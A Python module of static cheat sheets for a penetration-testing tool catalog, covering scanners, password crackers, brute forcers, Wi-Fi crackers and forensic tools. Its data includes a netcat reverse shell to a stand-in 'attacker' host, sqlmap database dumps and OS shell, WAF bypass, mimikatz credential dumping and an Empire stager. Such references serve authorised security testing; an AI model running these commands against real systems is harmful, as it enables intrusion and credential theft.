"""Offline cheat sheets for all one-click tools.

Each cheat sheet is a dict with title and sections (heading + markdown content).
All content is static Python data — no network calls.
"""
from __future__ import annotations

from typing import Any

#: Cheat sheets for all one-click tools in the catalog.
#: tool_id -> {title, sections: [{heading, content_md}]}
CHEAT_SHEETS: dict[str, dict[str, Any]] = {
    "nmap": {
        "title": "Nmap — Network Mapper",
        "sections": [
            {
                "heading": "Basic Scan",
                "content_md": (
                    "nmap -sV -sC <target>\n"
                    "# Version detection + default scripts"
                ),
            },
            {
                "heading": "Stealth Scan",
                "content_md": (
                    "nmap -sS -T4 <target>\n"
                    "# SYN scan, faster timing"
                ),
            },
            {
                "heading": "All Ports",
                "content_md": (
                    "nmap -p- <target>\n"
                    "# Scan all 65535 ports"
                ),
            },
            {
                "heading": "UDP Scan",
                "content_md": (
                    "nmap -sU --top-ports 100 <target>\n"
                    "# Top 100 UDP ports"
                ),
            },
        ],
    },
    "sqlmap": {
        "title": "SQLMap — SQL Injection",
        "sections": [
            {
                "heading": "Basic Injection Test",
                "content_md": (
                    "sqlmap -u \"http://target/page?id=1\" --batch\n"
                    "# Auto-detect injection point"
                ),
            },
            {
                "heading": "Dump Database",
                "content_md": (
                    "sqlmap -u \"URL\" -D dbname --dump --batch\n"
                    "# Dump entire database"
                ),
            },
            {
                "heading": "OS Shell",
                "content_md": (
                    "sqlmap -u \"URL\" --os-shell\n"
                    "# Requires write access + UNION"
                ),
            },
            {
                "heading": "Tamper Scripts",
                "content_md": (
                    "sqlmap -u \"URL\" --tamper=space2comment,between\n"
                    "# Bypass WAFs"
                ),
            },
        ],
    },
    "nikto": {
        "title": "Nikto — Web Scanner",
        "sections": [
            {"heading": "Basic Scan", "content_md": "nikto -h http://target\n# Default checks"},
            {"heading": "SSL Scan", "content_md": "nikto -h https://target -ssl\n# HTTPS target"},
            {
                "heading": "Specific Port",
                "content_md": "nikto -h http://target -p 8080\n# Custom port",
            },
        ],
    },
    "whatweb": {
        "title": "WhatWeb — Web Fingerprinter",
        "sections": [
            {
                "heading": "Basic Fingerprint",
                "content_md": "whatweb http://target\n# Identify CMS, frameworks",
            },
            {"heading": "Verbose", "content_md": "whatweb -v http://target\n# More detail"},
        ],
    },
    "dnsrecon": {
        "title": "DNSRecon — DNS Enumeration",
        "sections": [
            {
                "heading": "Standard Enumeration",
                "content_md": "dnsrecon -d example.com\n# AXFR, NSEC3, etc.",
            },
            {
                "heading": "Brute Force",
                "content_md": (
                    "dnsrecon -d example.com -D wordlists/dnsmap.txt -t brt\n"
                    "# Subdomain brute force"
                ),
            },
        ],
    },
    "theharvester": {
        "title": "theHarvester — OSINT",
        "sections": [
            {
                "heading": "Email Harvest",
                "content_md": "theHarvester -d example.com -b google,linkedin",
            },
            {"heading": "All Sources", "content_md": "theHarvester -d example.com -b all"},
        ],
    },
    "amass": {
        "title": "Amass — Attack Surface Mapping",
        "sections": [
            {"heading": "Subdomain Enumeration", "content_md": "amass enum -d example.com"},
            {"heading": "Intel Mode", "content_md": "amass intel -d example.com"},
        ],
    },
    "nuclei": {
        "title": "Nuclei — Template Scanner",
        "sections": [
            {"heading": "Basic Scan", "content_md": "nuclei -u http://target\n# Run all templates"},
            {
                "heading": "Specific Severity",
                "content_md": "nuclei -u http://target -s critical,high",
            },
            {
                "heading": "Custom Templates",
                "content_md": "nuclei -u http://target -t ~/custom-templates/",
            },
        ],
    },
    "testssl": {
        "title": "testssl.sh — SSL/TLS Scanner",
        "sections": [
            {
                "heading": "Basic Scan",
                "content_md": "testssl.sh target:443\n# Full SSL/TLS analysis",
            },
            {"heading": "Quick Scan", "content_md": "testssl.sh --fast target:443"},
        ],
    },
    "sslscan": {
        "title": "SSLScan — SSL/TLS Scanner",
        "sections": [
            {
                "heading": "Basic Scan",
                "content_md": "sslscan target:443\n# Cipher suites + cert info",
            },
        ],
    },
    "john": {
        "title": "John the Ripper — Password Cracker",
        "sections": [
            {
                "heading": "Auto Mode",
                "content_md": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
            },
            {
                "heading": "Specific Format",
                "content_md": "john --format=raw-md5 --wordlist=wordlist.txt hashes.txt",
            },
            {"heading": "Show Cracked", "content_md": "john --show hashes.txt"},
        ],
    },
    "hashcat": {
        "title": "Hashcat — GPU Password Cracker",
        "sections": [
            {"heading": "MD5 Crack", "content_md": "hashcat -m 0 -a 0 hashes.txt wordlist.txt"},
            {"heading": "NTLM Crack", "content_md": "hashcat -m 1000 -a 0 hashes.txt wordlist.txt"},
            {
                "heading": "Mask Attack",
                "content_md": "hashcat -m 0 -a 3 hashes.txt ?d?d?d?d?d?d?d?d",
            },
            {"heading": "Show Cracked", "content_md": "hashcat --show -m 0 hashes.txt"},
        ],
    },
    "hydra": {
        "title": "Hydra — Online Brute Forcer",
        "sections": [
            {"heading": "SSH Brute", "content_md": "hydra -l admin -P wordlist.txt ssh://target"},
            {
                "heading": "HTTP Form",
                "content_md": (
                    "hydra -L users.txt -P wordlist.txt target "
                    "http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\""
                ),
            },
        ],
    },
    "medusa": {
        "title": "Medusa — Parallel Brute Forcer",
        "sections": [
            {
                "heading": "SSH Brute",
                "content_md": "medusa -h target -u admin -P wordlist.txt -M ssh",
            },
        ],
    },
    "cewl": {
        "title": "CeWL — Custom Wordlist Generator",
        "sections": [
            {
                "heading": "Basic Crawl",
                "content_md": "cewl -d 2 -m 6 -w wordlist.txt http://target",
            },
        ],
    },
    "crunch": {
        "title": "Crunch — Wordlist Generator",
        "sections": [
            {
                "heading": "Numeric Mask",
                "content_md": "crunch 4 4 0123456789\n# All 4-digit combos",
            },
            {
                "heading": "Pattern Mask",
                "content_md": "crunch 8 8 -t pass@@@@\n# pass + 4 lowercase",
            },
        ],
    },
    "gobuster": {
        "title": "Gobuster — Directory/DNS Bruteforcer",
        "sections": [
            {
                "heading": "Dir Mode",
                "content_md": (
                    "gobuster dir -u http://target -w "
                    "/usr/share/wordlists/dirb/common.txt"
                ),
            },
            {"heading": "DNS Mode", "content_md": "gobuster dns -d example.com -w subdomains.txt"},
        ],
    },
    "ffuf": {
        "title": "FFuF — Fuzz Faster U Fool",
        "sections": [
            {
                "heading": "Directory Fuzz",
                "content_md": "ffuf -w wordlist.txt -u http://target/FUZZ",
            },
            {
                "heading": "Vhost Fuzz",
                "content_md": "ffuf -w vhosts.txt -u http://target -H \"Host: FUZZ.target\"",
            },
        ],
    },
    "dirb": {
        "title": "Dirb — Web Content Scanner",
        "sections": [
            {"heading": "Basic Scan", "content_md": "dirb http://target"},
            {
                "heading": "Custom Wordlist",
                "content_md": "dirb http://target /usr/share/wordlists/dirb/big.txt",
            },
        ],
    },
    "wpscan": {
        "title": "WPScan — WordPress Scanner",
        "sections": [
            {"heading": "Basic Scan", "content_md": "wpscan --url http://target/wp"},
            {
                "heading": "API Token",
                "content_md": "wpscan --url http://target/wp --api-token YOUR_TOKEN",
            },
        ],
    },
    "aircrack-ng": {
        "title": "Aircrack-ng — WiFi Cracker",
        "sections": [
            {
                "heading": "Capture Handshake",
                "content_md": "airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture",
            },
            {"heading": "Crack WPA", "content_md": "aircrack-ng -w wordlist.txt capture-01.cap"},
        ],
    },
    "reaver": {
        "title": "Reaver — WPS Cracker",
        "sections": [
            {"heading": "WPS Attack", "content_md": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv"},
        ],
    },
    "wifite": {
        "title": "Wifite — Automated WiFi Auditor",
        "sections": [
            {"heading": "Auto Attack", "content_md": "wifite --wps\n# Automated WPS + WPA attacks"},
        ],
    },
    "mimikatz": {
        "title": "Mimikatz — Credential Dumper",
        "sections": [
            {
                "heading": "Dump Credentials",
                "content_md": "mimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords",
            },
        ],
    },
    "empire": {
        "title": "Empire — Post-Exploitation Framework",
        "sections": [
            {
                "heading": "Start Listener",
                "content_md": "usestager windows/launcher_bat\nset Listener http\nexecute",
            },
        ],
    },
    "meterpreter": {
        "title": "Meterpreter — Metasploit Shell",
        "sections": [
            {
                "heading": "Basic Commands",
                "content_md": "meterpreter > sysinfo\nmeterpreter > getuid\nmeterpreter > shell",
            },
        ],
    },
    "volatility": {
        "title": "Volatility3 — Memory Forensics",
        "sections": [
            {"heading": "Image Info", "content_md": "vol -f memory.dump windows.info"},
            {"heading": "Process List", "content_md": "vol -f memory.dump windows.pslist"},
            {
                "heading": "Dump Files",
                "content_md": "vol -f memory.dump windows.filescan | grep <pattern>",
            },
        ],
    },
    "sleuthkit": {
        "title": "SleuthKit — Disk Forensics",
        "sections": [
            {"heading": "File System Info", "content_md": "fsstat disk.img"},
            {"heading": "List Files", "content_md": "fls -r disk.img"},
            {"heading": "Recover File", "content_md": "icat disk.img <inode> > recovered_file"},
        ],
    },
    "foremost": {
        "title": "Foremost — File Carver",
        "sections": [
            {"heading": "Basic Carve", "content_md": "foremost -i disk.img -o output/"},
            {
                "heading": "Specific Types",
                "content_md": "foremost -t jpg,pdf,doc -i disk.img -o output/",
            },
        ],
    },
    "binwalk": {
        "title": "Binwalk — Firmware Analyzer",
        "sections": [
            {"heading": "Analyze Firmware", "content_md": "binwalk firmware.bin"},
            {"heading": "Extract", "content_md": "binwalk -e firmware.bin"},
        ],
    },
    "exiftool": {
        "title": "ExifTool — Metadata Viewer",
        "sections": [
            {"heading": "View Metadata", "content_md": "exiftool image.jpg"},
            {"heading": "Strip Metadata", "content_md": "exiftool -all= image.jpg"},
        ],
    },
    "tcpdump": {
        "title": "tcpdump — Packet Capture",
        "sections": [
            {"heading": "Basic Capture", "content_md": "tcpdump -i eth0 -w capture.pcap"},
            {"heading": "Filter by Port", "content_md": "tcpdump -i eth0 port 80"},
            {"heading": "Filter by Host", "content_md": "tcpdump -i eth0 host 192.168.1.100"},
        ],
    },
    "tshark": {
        "title": "TShark — Wireshark CLI",
        "sections": [
            {"heading": "Basic Capture", "content_md": "tshark -i eth0 -w capture.pcap"},
            {"heading": "Read PCAP", "content_md": "tshark -r capture.pcap -Y \"http\""},
            {"heading": "Statistics", "content_md": "tshark -r capture.pcap -q -z io,stat,1"},
        ],
    },
    "wireshark": {
        "title": "Wireshark — Packet Analyzer",
        "sections": [
            {"heading": "GUI Launch", "content_md": "wireshark -i eth0"},
            {"heading": "Read PCAP", "content_md": "wireshark capture.pcap"},
        ],
    },
    "searchsploit": {
        "title": "SearchSploit — Exploit Database",
        "sections": [
            {"heading": "Search Exploits", "content_md": "searchsploit apache 2.4.49"},
            {"heading": "Copy Exploit", "content_md": "searchsploit -m 50000"},
        ],
    },
    "netcat": {
        "title": "Netcat — Swiss Army Knife",
        "sections": [
            {"heading": "Reverse Shell", "content_md": "nc -e /bin/bash attacker 4444"},
            {"heading": "Listen", "content_md": "nc -lvnp 4444"},
            {"heading": "Port Scan", "content_md": "nc -zv target 1-1000"},
        ],
    },
    "socat": {
        "title": "socat — Socket Cat",
        "sections": [
            {"heading": "Port Forward", "content_md": "socat TCP-LISTEN:8080,fork TCP:target:80"},
        ],
    },
    "burp": {
        "title": "Burp Suite — Web Proxy",
        "sections": [
            {"heading": "Launch", "content_md": "burpsuite"},
        ],
    },
}


def get_cheatsheet(tool_id: str) -> dict[str, Any] | None:
    """Get a cheat sheet by tool_id.
    
    Returns:
        dict with title and sections, or None if not found.
    """
    return CHEAT_SHEETS.get(tool_id)


def list_cheatsheets() -> list[dict[str, Any]]:
    """List all available cheat sheets (metadata only).
    
    Returns:
        List of {tool_id, title} dicts.
    """
    return [
        {"tool_id": tool_id, "title": data["title"]}
        for tool_id, data in CHEAT_SHEETS.items()
    ]